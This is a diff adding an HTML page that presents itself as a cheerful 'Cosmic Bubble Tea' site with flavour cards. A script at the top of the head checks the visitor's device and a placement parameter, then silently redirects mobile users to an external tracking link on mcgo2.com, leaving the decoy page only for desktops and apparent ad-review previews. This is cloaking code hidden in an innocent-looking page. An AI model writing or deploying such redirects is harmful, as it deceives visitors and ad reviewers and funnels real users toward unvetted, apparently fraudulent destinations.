@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Bubble Tea</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #ff69b4;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        .bubble-tea {
+            background-color: rgba(255, 255, 255, 0.7);
+            border-radius: 50%;
+            padding: 20px;
+            margin: 10px;
+            text-align: center;
+            width: 200px;
+            height: 200px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            transition: transform 0.3s;
+        }
+        .bubble-tea:hover {
+            transform: scale(1.1) rotate(10deg);
+        }
+        footer {
+            background-color: #4b0082;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #ffd700;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>🌌 Cosmic Bubble Tea 🌌</h1>
+    </header>
+    <main>
+        <div class="bubble-tea">
+            <h2>Milky Way Matcha</h2>
+            <p>A swirling galaxy of green tea goodness!</p>
+        </div>
+        <div class="bubble-tea">
+            <h2>Supernova Strawberry</h2>
+            <p>Exploding with berry flavor!</p>
+        </div>
+        <div class="bubble-tea">
+            <h2>Black Hole Boba</h2>
+            <p>So good, it'll suck you in!</p>
+        </div>
+        <div class="bubble-tea">
+            <h2>Asteroid Almond</h2>
+            <p>Nutty flavor from outer space!</p>
+        </div>
+    </main>
+    <footer>
+        <p>© 2023 Cosmic Bubble Tea | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
